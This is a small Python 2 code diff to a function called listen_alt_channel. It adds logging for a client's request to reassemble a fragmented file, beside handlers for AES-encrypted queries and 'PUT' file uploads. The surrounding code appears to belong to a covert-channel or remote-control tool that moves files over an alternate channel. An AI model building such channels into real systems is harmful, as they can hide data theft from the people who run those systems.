@@ -74,6 +74,9 @@ def listen_alt_channel(timeout):
                         client.send(utils.EncodeAES(cipher, clear_reply))
                 except IndexError:
                     pass
+                if 'fragments' in decrypted_query.split(':'):
+                    N = decrypted_query.split(':')[1]
+                    print '[*] %s is requesting fragmented file re-assembly' % client_addr[0]
                 # Upload file
                 try:
                     if 'PUT' in decrypted_query.split('_'):
